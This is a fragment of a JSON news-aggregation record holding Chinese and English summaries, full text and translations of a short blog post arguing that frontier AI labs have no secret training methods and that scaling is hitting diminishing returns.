+      "summary": "文章探讨了当前前沿 AI 实验室（如 Anthropic）是否拥有超越公开技术的秘密训练方法。作者认为，所谓‘Claude Mythos’模型并无特殊技巧，其能力主要来自常规的大规模数据训练和工程优化。对于可验证的任务领域，提升性能只需修复 bug 和扩大规模。因此，作者指出 Anthropic 急于推动监管俘获，是因为 AI 行业缺乏真正的护城河。",
+      "summaryEn": "The article examines whether leading AI labs possess secret training methods beyond public knowledge, specifically addressing the 'Claude Mythos' model. The author argues there are no hidden tricks—Mythos relies on standard large-scale data training and engineering optimizations. For verifiable domains, performance gains come only from bug fixes and scaling up infrastructure. Consequently, the author contends that Anthropic's push for regulatory capture stems from a lack of genuine competitive moats in the AI industry.",
+      "reason": "揭示了 AI 巨头依赖监管而非技术优势的本质，对理解当前 AI 竞争格局具有批判性价值。",
+      "fullTextStatus": "ok",
+      "fullText": {
+        "siteName": "the singularity is nearer",
+        "partial": false,
+        "blocks": [
+          {
+            "type": "p",
+            "text": "I thought about posting this paper but rebranding it as the Claude Mythos technical report. As far as I can tell, there’s no secret tricks the US frontier labs have, and that basically describes how Mythos was trained. What’s in that paper just works, and for verifiable domains, it’s only a matter of fixing bugs and scaling up. That’s why Anthropic is so desperate for regulatory capture, AI has no moat."
+          },
+          {
+            "type": "p",
+            "text": "AI (and any form of search) has this property where you spend exponentially more money to get linear returns. So for a bit we’ll live in an era where AI can in theory solve very hard problems, but it’s very expensive to do so."
+          },
+          {
+            "type": "p",
+            "text": "The Internet has been fully mined, and it yielded 20T good tokens. For a Chinchilla optimal model, that’s only 1T weights (1e26 training run if dense). 500 GB gets you all of human knowledge in a simple to query archive. For comparison, Wikipedia is 24 GB with mediocre compression."
+          },
+          {
+            "type": "p",
+            "text": "Technology proceeds in terms of S-curves, and AI has gone through a few of them already. I know I’m quite late to this, but I’m feeling optimistic that scaling will mostly stop yielding results. GPT 5.5 is to a point where it’s really hard for me to stump it with any problem. What does “superhuman intelligence” even mean at that point if humans can’t detect it if it’s superhuman?"
+          },
+          {
+            "type": "p",
+            "text": "There will be some domains where it’s still detectable. Any form of optimization where the humans can marvel at how low it got the number qualifies. And there will be creepy Medusa systems that directly optimize for engagement, be careful not to look at them directly. But what does it mean for a song to be superhuman? Contrary to the beliefs of the rationality cult, most things aren’t optimization problems. The whole hard problem is determining what to optimize for."
+          },
+          {
+            "type": "p",
+            "text": "The era of scaling yields clearly better AI is over, now we enter an era of efficiency and taste. Let’s get the tools to hit the end of this S-curve distributed to as many people as possible. Taste is an arena where tons of people can play."
+          }
+        ],
+        "translations": [
+          "我本来想发这篇论文，但打算把它重新命名为《Claude Mythos技术报告》。据我所知，美国前沿实验室并没有藏着什么秘密技巧，Mythos的训练方式基本上就是这样。论文里的东西确实有效，在可验证的领域里，只需要修复bug并扩大规模就行了。这就是为什么Anthropic如此迫切地想要监管俘获——AI没有护城河。",
+          "AI（以及任何形式的搜索）都有这样一个特性：投入的钱呈指数增长，而获得的回报却是线性的。所以我们暂时会生活在一个时代：理论上AI能解决非常困难的问题，但要做到这一点代价极高。",
+          "互联网已经被完全挖掘，产生了20万亿个优质token。对于一个Chinchilla最优模型来说，这仅相当于1万亿个权重（如果是稠密模型，训练量就是1e26次运算）。500GB就能把所有人类知识打包成一个易于查询的档案。相比之下，维基百科压缩后也有24GB。",
+          "技术发展遵循S型曲线，AI已经经历了好几轮。我知道自己来得有点晚，但我对“缩放即将停止带来新突破”这一趋势感到乐观。GPT-5.5已经到了一个地步，我几乎找不到能难倒它的问题。如果人类都无法察觉其“超人类智能”，那“超人类智能”到底意味着什么？",
+          "某些领域仍可能检测到这种能力。只要人类看到某个数字被优化到极低水平时感到惊叹，就算是一种检测。还有一些令人毛骨悚然的“美杜莎系统”会直接优化参与度，千万别直视它们。但一首歌要算“超人类”是什么意思呢？与理性崇拜者的信念相反，大多数事情都不是优化问题。真正困难的是确定该优化什么。",
+          "“通过扩大规模就能明显提升AI性能”的时代已经结束，现在我们进入了“效率与品味”的时代。让我们把这套工具分发出去，让更多人参与到这条S型曲线的终点冲刺中来。品味这个领域可以容纳无数人参与。"
+        ]
+      },
+      "fromDate": "2026-05-21"
+    }
+  ]
+}
